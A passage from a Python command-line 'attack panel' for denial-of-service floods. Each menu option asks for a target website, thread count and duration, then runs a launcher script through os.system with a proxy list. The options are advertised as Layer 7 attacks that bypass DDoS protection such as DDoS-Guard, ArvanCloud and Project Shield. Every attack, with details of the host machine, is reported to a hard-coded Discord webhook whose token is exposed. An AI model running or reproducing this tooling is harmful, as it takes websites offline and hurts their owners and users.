                    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                    embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')


                    embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                    embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                    embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embed.set_timestamp()


                    embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
                    embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                    embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                    embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                    embed.add_embed_field(name='Method:', value='mh-ddosguard')
                    embed.add_embed_field(name='Machine:', value=f'{machine}')
                    embed.add_embed_field(name='System OS:', value=f'{systemos}')
                    embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                    embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                    embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
                    embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                    embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
                    embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                    embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                    webhook.add_embed(embed)
                    response = webhook.execute()
                    os.system(mhgetsend)
                    webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                    embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')


                    embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                    embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                    embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embedx.set_timestamp()


                    embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
                    embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                    embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                    embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                    embedx.add_embed_field(name='Method:', value='mh-ddosguard')
                    embedx.add_embed_field(name='Machine:', value=f'{machine}')
                    embedx.add_embed_field(name='System OS:', value=f'{systemos}')
                    embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                    embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                    embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
                    embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                    embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
                    embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                    embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                    webhookx.add_embed(embedx)
                    responsex = webhookx.execute()
                    load()
                    license()
                    menu()
                if menuoption == "mh-arvancloud":
                    load()
                    print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-arvancloud \033[31m: \033[36m Powerfull Layer 7 Attack: Bypass ARVAN CLOUD \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                    mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                    mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                    mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                    mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                    mhgetsend = ('python3 start.py avb ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                    tip()
                    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                    embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')


                    embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                    embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                    embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embed.set_timestamp()


                    embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
                    embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                    embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                    embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                    embed.add_embed_field(name='Method:', value='mh-arvancloud')
                    embed.add_embed_field(name='Machine:', value=f'{machine}')
                    embed.add_embed_field(name='System OS:', value=f'{systemos}')
                    embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                    embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                    embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
                    embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                    embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
                    embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                    embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                    webhook.add_embed(embed)
                    response = webhook.execute()
                    os.system(mhgetsend)
                    webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                    embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')


                    embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                    embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                    embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embedx.set_timestamp()


                    embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
                    embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                    embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                    embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                    embedx.add_embed_field(name='Method:', value='mh-arvancloud')
                    embedx.add_embed_field(name='Machine:', value=f'{machine}')
                    embedx.add_embed_field(name='System OS:', value=f'{systemos}')
                    embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                    embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                    embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
                    embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                    embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
                    embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                    embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                    webhookx.add_embed(embedx)
                    responsex = webhookx.execute()
                    load()
                    license()
                    menu()
                if menuoption == "mh-projectshield":
                    load()
                    print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-projectshield \033[31m: \033[36m Powerfull Layer 7 Attack: Bypass PROJECT SHIELD \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                    mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                    mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                    mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                    mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                    mhgetsend = ('python3 start.py gsb ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                    tip()
                    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                    embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')


                    embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                    embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                    embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embed.set_timestamp()


                    embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
                    embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                    embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                    embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                    embed.add_embed_field(name='Method:', value='mh-projectshield')
                    embed.add_embed_field(name='Machine:', value=f'{machine}')
                    embed.add_embed_field(name='System OS:', value=f'{systemos}')
                    embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                    embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                    embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
                    embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                    embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
                    embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                    embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                    webhook.add_embed(embed)
                    response = webhook.execute()
                    os.system(mhgetsend)
                    webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                    embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')


                    embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                    embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                    embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embedx.set_timestamp()


                    embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
                    embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                    embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                    embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                    embedx.add_embed_field(name='Method:', value='mh-projectshield')
                    embedx.add_embed_field(name='Machine:', value=f'{machine}')
                    embedx.add_embed_field(name='System OS:', value=f'{systemos}')
                    embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                    embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                    embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
                    embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                    embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
                    embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                    embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                    webhookx.add_embed(embedx)
                    responsex = webhookx.execute()
                    load()
                    license()
                    menu()
                if menuoption == "mh-even":
                    load()
                    print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-even \033[31m: \033[36m Powerfull Layer 7 Attack: EVEN \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                    mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                    mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                    mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                    mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                    mhgetsend = ('python3 start.py even ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                    tip()
                    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                    embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')


                    embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                    embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                    embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embed.set_timestamp()


                    embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
                    embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                    embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                    embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                    embed.add_embed_field(name='Method:', value='mh-even')
                    embed.add_embed_field(name='Machine:', value=f'{machine}')
                    embed.add_embed_field(name='System OS:', value=f'{systemos}')
                    embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                    embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                    embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
                    embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                    embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
                    embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                    embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                    webhook.add_embed(embed)
                    response = webhook.execute()
                    os.system(mhgetsend)
                    webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                    embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')


                    embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                    embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                    embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embedx.set_timestamp()


                    embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
                    embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                    embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                    embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                    embedx.add_embed_field(name='Method:', value='mh-even')
                    embedx.add_embed_field(name='Machine:', value=f'{machine}')
                    embedx.add_embed_field(name='System OS:', value=f'{systemos}')
                    embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                    embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                    embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
                    embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                    embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
                    embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                    embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                    webhookx.add_embed(embedx)
                    responsex = webhookx.execute()
                    load()
                    license()
                    menu()
                if menuoption == "mh-get":
                    load()
                    print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-get \033[31m: \033[36m Powerfull Layer 7 Attack: GET \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                    mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                    mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                    mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                    mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                    mhgetsend = ('python3 start.py get ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                    tip()
                    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                    embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')


                    embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                    embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                    embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embed.set_timestamp()


                    embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
                    embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                    embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                    embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                    embed.add_embed_field(name='Method:', value='mh-get')
                    embed.add_embed_field(name='Machine:', value=f'{machine}')
                    embed.add_embed_field(name='System OS:', value=f'{systemos}')
                    embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                    embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                    embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
                    embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                    embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
                    embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                    embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                    webhook.add_embed(embed)
                    response = webhook.execute()
                    os.system(mhgetsend)
                    webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                    embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')


                    embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                    embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                    embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embedx.set_timestamp()


                    embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
                    embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                    embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                    embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                    embedx.add_embed_field(name='Method:', value='mh-get')
                    embedx.add_embed_field(name='Machine:', value=f'{machine}')
                    embedx.add_embed_field(name='System OS:', value=f'{systemos}')
                    embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                    embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                    embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
                    embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                    embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
                    embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                    embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                    webhookx.add_embed(embedx)
                    responsex = webhookx.execute()
                    load()
                    license()
                    menu()
                if menuoption == "mh-post":
                    load()
                    print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-post \033[31m: \033[36m Powerfull Layer 7 Attack: POST\033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                    mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                    mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                    mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                    mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                    mhgetsend = ('python3 start.py post ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                    tip()
                    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                    embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')


                    embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                    embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                    embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embed.set_timestamp()


                    embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
                    embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                    embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                    embed.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                    embed.add_embed_field(name='Method:', value='mh-post')
                    embed.add_embed_field(name='Machine:', value=f'{machine}')
                    embed.add_embed_field(name='System OS:', value=f'{systemos}')
                    embed.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                    embed.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                    embed.add_embed_field(name='Total RAM:', value=f'{totalram}')
                    embed.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                    embed.add_embed_field(name='Used RAM:', value=f'{usedram}')
                    embed.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                    embed.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                    webhook.add_embed(embed)
                    response = webhook.execute()
                    os.system(mhgetsend)
                    webhookx = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                    embedx = DiscordEmbed(title='Panel Attack API', description='Notices every STOPPED attack via the panel.', color='03b2f8')


                    embedx.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                    embedx.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embedx.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                    embedx.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embedx.set_timestamp()


                    embedx.add_embed_field(name='Attack Stopped for:', value=f'{mhgetWEB}')
                    embedx.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                    embedx.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
                    embedx.add_embed_field(name='Time:', value=f'{mhgetTIME}')
                    
                    embedx.add_embed_field(name='Method:', value='mh-post')
                    embedx.add_embed_field(name='Machine:', value=f'{machine}')
                    embedx.add_embed_field(name='System OS:', value=f'{systemos}')
                    embedx.add_embed_field(name='Physical Cores:', value=f'{pyshicalcores}')
                    embedx.add_embed_field(name='Logical Cores:', value=f'{logicalcores}')
                    embedx.add_embed_field(name='Total RAM:', value=f'{totalram}')
                    embedx.add_embed_field(name='Available RAM:', value=f'{avaliableram}')
                    embedx.add_embed_field(name='Used RAM:', value=f'{usedram}')
                    embedx.add_embed_field(name='RAM Usage in %:', value=f'{ramusagepercent}')
                    embedx.add_embed_field(name='VPS Speed:', value=f'{speedtestbaba}')
                  



                    webhookx.add_embed(embedx)
                    responsex = webhookx.execute()
                    load()
                    license()
                    menu()
                if menuoption == "mh-dyn":
                    load()
                    print("""
\033[36m[\033[39mMETHODS\033[36m]\033[0m

\033[31m\033[1m⮞ \033[0m\033[39mmh-dyn \033[31m: \033[36m Powerfull Layer 7 Attack: DYN \033[31m[\033[32mRUNNING\033[31m]\033[0m

            """)
                    mhgetWEB = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
                    mhogetTHREADS = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(1000 minimal):\033[31m:\033[36m\033[31m")
                    mhgetmultiip = input("\033[31m\033[1m⮞ \033[0m\033[96mMulti IP:\033[31m:\033[36m\033[31m")
                    mhgetTIME = input("\033[31m\033[1m⮞ \033[0m\033[96mTime:\033[31m:\033[36m\033[31m")
                    mhgetsend = ('python3 start.py dyn ' + mhgetWEB + ' 1' + f' {mhogetTHREADS} proxies.txt {mhgetmultiip} {mhgetTIME}')
                    tip()
                    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/859843861575499877/ZQuAMpvIb7cri0lXM4oFJUr6ABVyspCBSFqPuctLk6hC_M4Lm6jr0Hk-lCkKlPVnIOaU')


                    embed = DiscordEmbed(title='Panel Attack API', description='Notices every sended attack via the panel.', color='03b2f8')


                    embed.set_author(name=f'Machine Name: {hostname}', icon_url='https://www.shareicon.net/data/512x512/2015/09/16/101867_archlinux_512x512.png')

                    embed.set_image(url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embed.set_thumbnail(url='https://www.logomoose.com/wp-content/uploads/2009/10/attack.jpg')


                    embed.set_footer(text='Panel Attack API', icon_url='https://media1.tenor.com/images/75861daefc982db8ee6c9e05c1a8c55b/tenor.gif?itemid=15335006')


                    embed.set_timestamp()


                    embed.add_embed_field(name='Attack Send to:', value=f'{mhgetWEB}')
                    embed.add_embed_field(name='Threads:', value=f'{mhogetTHREADS}')
                    embed.add_embed_field(name='Multi IP:', value=f'{mhgetmultiip}')
